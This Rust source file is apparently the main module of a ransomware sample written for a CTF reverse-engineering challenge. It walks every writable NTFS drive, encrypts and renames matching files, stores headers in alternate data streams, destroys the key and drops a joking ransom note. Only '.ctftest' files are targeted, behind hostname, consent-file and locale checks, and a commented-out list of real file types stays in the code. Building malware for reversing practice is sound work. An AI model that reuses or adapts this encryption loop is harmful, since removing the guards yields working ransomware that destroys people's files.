#![cfg_attr(not(test), windows_subsystem = "windows")]

mod cipher;
mod key_mgmt;

use anyhow::{anyhow, bail, Result};
use cipher::PerVictimKey;
use single_instance::SingleInstance;
use skip_error::{skip_error_and_debug, SkipError};
use windows::Win32::UI::Shell::ShellExecuteW;
use std::fs;
use std::fs::File;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::mpsc;
use std::thread;
use sys_locale::get_locale;
use walkdir::WalkDir;
use widestring::U16CString;
use windows::w;
use windows::Win32::Storage::FileSystem::{GetLogicalDrives, GetVolumeInformationW};
use windows::Win32::System::SystemServices::{FILE_NAMED_STREAMS, FILE_READ_ONLY_VOLUME};
use windows::{Win32::System::WindowsProgramming::*, Win32::UI::WindowsAndMessaging::*};

// blake3::hash(b"the-victim-host-8deb7b96")
const EXPECTED_COMPUTER_NAME_HASH_HEX: &'static str =
    "7e199a3cd61f888b67bbc6eb5ea707bca51b6d5af06b39c2fb038426f1a17fe5";
const CONSENT_MARKER_FILE_NAME: &'static str =
    "YesIKnowIAmRunningARealRansomwareTheDecryptionKeyWillOnlyBeReleasedAfterTheCTFEndsPleaseGoOn.txt";
const RANSOM_LETTER_FILE_NAME: &'static str = "README_ALL_YOUR_FILES_ARE_BELONG_TO_US.txt";
// const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &[
//     "txt", "doc", "docx", "jpg", "png", "bmp", "7z", "zip", "rar", "sav", "py", "js", "ppt",
//     "pptx", "xls", "xlsx",
// ];
const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &["ctftest"];
const QUEUE_SIZE: usize = 1024;

fn get_computer_name() -> Result<String> {
    let mut size = 0;
    unsafe {
        GetComputerNameW(windows::core::PWSTR::null(), &mut size);
    }
    let mut buffer = Vec::with_capacity(size as usize);
    let bptr = windows::core::PWSTR::from_raw(buffer.as_mut_ptr());
    unsafe { GetComputerNameW(bptr, &mut size).ok()? };
    Ok(unsafe { bptr.to_string()? })
}

fn check_precondition() -> Result<()> {
    let computer_name = get_computer_name()?.to_ascii_lowercase();
    let computer_name_hash = blake3::hash(computer_name.as_bytes());
    let expected_hash: blake3::Hash = EXPECTED_COMPUTER_NAME_HASH_HEX.parse().unwrap();
    if computer_name_hash != expected_hash {
        bail!("computer name mismatches");
    }

    let user_dirs = directories::UserDirs::new().unwrap();
    let desktop = user_dirs
        .desktop_dir()
        .ok_or(anyhow!("failed to find desktop"))?;
    if !desktop.join(CONSENT_MARKER_FILE_NAME).exists() {
        bail!("no consent marker found");
    }
    if get_locale().ok_or_else(|| anyhow::anyhow!("failed to get locale"))? != "eo-001" {
        bail!("locale mismatches");
    }
    Ok(())
}

fn assert_precondition() {
    if let Err(err) = check_precondition() {
        // msg_u16 MUST not be dropped before msg
        let msg_u16 = U16CString::from_str(format!(
            "Precondition check failed: {}\n\n\
            Please DO note that you are running a MALWARE specifically created for a CTF, \
            make sure you're debugging this in a sandboxed environment, do NOT blindly patch this out!\n\
            请注意：你正在运行一个恶意软件，请确保你在沙箱环境中调试，不要无脑去除这个检查！",
            err
        )).unwrap();
        let msg = windows::core::PCWSTR::from_raw(msg_u16.as_ptr());
        unsafe {
            MessageBoxW(None, msg, w!("Error"), MB_OK | MB_ICONERROR);
        }
        std::process::exit(0)
    }
}

fn get_all_suitable_drives() -> Vec<String> {
    let drive_mask = unsafe { GetLogicalDrives() };
    let mut result: Vec<String> = Vec::new();
    for i in 0..26 {
        if (drive_mask & (1 << i)) == 0 {
            continue;
        }
        let drive = format!("{}:\\", (b'A' + i as u8) as char);
        // Call GetVolumeInformation to check the filesystem type
        let mut fs_type = [0u16; 16];
        let drive_u16 = U16CString::from_str(drive.clone()).unwrap();
        let drive_ptr = windows::core::PCWSTR::from_raw(drive_u16.as_ptr());
        let mut flags: u32 = 0;
        unsafe {
            if !GetVolumeInformationW(
                drive_ptr,
                None,
                None,
                None,
                Some(&mut flags),
                Some(&mut fs_type),
            )
            .as_bool()
            {
                continue;
            }
        }
        if fs_type[..5] != [b'N' as u16, b'T' as u16, b'F' as u16, b'S' as u16, 0] {
            continue;
        }
        if (flags & FILE_READ_ONLY_VOLUME != 0) || (flags & FILE_NAMED_STREAMS == 0) {
            continue;
        }
        result.push(drive)
    }
    result
}

fn is_victim_file(entry: &walkdir::DirEntry) -> bool {
    if let Some(ext) = entry.path().extension() {
        return entry.file_type().is_file()
            && entry.file_name() != RANSOM_LETTER_FILE_NAME
            && EXTENSION_TO_ENCRYPT.iter().any(|v| v == &ext);
    }
    return false;
}

fn encrypt_file(path: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
    let mut new_name = path.as_ref().file_name().unwrap().to_owned();
    new_name.push(".UCryNow");
    let new_path = path.as_ref().with_file_name(&new_name);
    new_name.push(":HRW");
    let ads_path = path.as_ref().with_file_name(new_name);

    fs::rename(&path, &new_path)?;
    let mut fin = File::open(&new_path)?;
    let mut fout = File::options().read(true).write(true).open(&new_path)?;
    let mut fads = File::create(&ads_path)?;
    let header = cipher::encrypt_stream(&key, &mut fin, &mut fout)?;
    fads.write_all(&header.to_vec())?;
    Ok(())
}

fn drop_ransom_letter(dir: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
    File::create(dir.as_ref().join(RANSOM_LETTER_FILE_NAME))?.write_all(format!(r#"Good morning!
All your files are belong to us. Don't worry, they are encrypted by extremely safe modern cryptography.
We can help you recover your files, but only after you pay us 1,000,000,007 meme gifs, and only after CTF ends.
Complain hard in the DingTalk group (or Discord channel) if you want to get trolled, or REVERSE HARDER if you want to get your files back.

早上好！一眼*真，鉴定为密！别担心，您的文件都被非常安全的现代密码学算法加密惹。
我们可以帮助您恢复您的文件，但是只有在您支付给我们 1000000007 个表情包后，并且您得等到 CTF 结束。
如果您想要被嘲笑，请用力在钉钉群（或 Discord 频道）里吐槽，如果您想要恢复您的文件，请 用 力 逆 向！

Send memes along with the victim identifier to lolnoway@pm.me.

Your victim identifier is: {}

"#, &key.seal_for_operator()).as_bytes())?;
    Ok(())
}

fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
    let drives = get_all_suitable_drives();
    let (letter_tx, letter_rx) = mpsc::channel::<PathBuf>();
    let (tx, rx) = crossbeam_channel::bounded(QUEUE_SIZE);
    let mut workers = Vec::new();
    for _ in 0..thread::available_parallelism()?.get() {
        let key = key.clone();
        let rx = rx.clone();
        let letter_tx = letter_tx.clone();
        let jh = thread::spawn(move || {
            rx.iter()
                .map(|f| encrypt_file(&f, &key).and_then(|_| letter_tx.send(f).or(Ok(()))))
                .skip_error_and_debug();
        });
        workers.push(jh);
    }
    let letterguy = {
        let key = key.clone();
        thread::spawn(move || {
            for f in letter_rx {
                if let Some(dir) = f.parent() {
                    if !dir.join(RANSOM_LETTER_FILE_NAME).exists() {
                        skip_error_and_debug!(drop_ransom_letter(&dir, &key));
                    }
                }
            }
        })
    };
    for drive in drives {
        let walker = WalkDir::new(drive).same_file_system(true).into_iter();
        for entry in walker
            .skip_error()
            .filter(|e| !e.path_is_symlink() && is_victim_file(&e))
        {
            skip_error_and_debug!(tx.send(entry.into_path()));
        }
    }
    drop(tx);
    for jh in workers {
        jh.join().unwrap();
    }
    letterguy.join().unwrap();
    Ok(())
}

fn try_show_ransom_letter_on_desktop(victim_key: &PerVictimKey) -> Result<()> {
    if let Some(desktop_dir) = directories::UserDirs::new()
        .expect("UserDirs must work if we got here")
        .desktop_dir()
    {
        drop_ransom_letter(desktop_dir, &victim_key)?;
        let filename = U16CString::from_os_str(desktop_dir.join(RANSOM_LETTER_FILE_NAME))?;
        let lpfile = windows::core::PCWSTR::from_raw(filename.as_ptr());
        unsafe {
            ShellExecuteW(None, w!("open"), lpfile, None, None, SW_SHOWMAXIMIZED);
        }
    }
    Ok(())
}

fn main() -> Result<()> {
    assert_precondition();
    let holder = SingleInstance::new("happyropeware-dc52184435e51deee395")?;
    if !holder.is_single() {
        return Ok(());
    }

    let victim_key = key_mgmt::ensure_key()?;
    the_boring_loop(&victim_key)?;
    key_mgmt::destroy_key()?;
    try_show_ransom_letter_on_desktop(&victim_key).ok();
    Ok(())
}
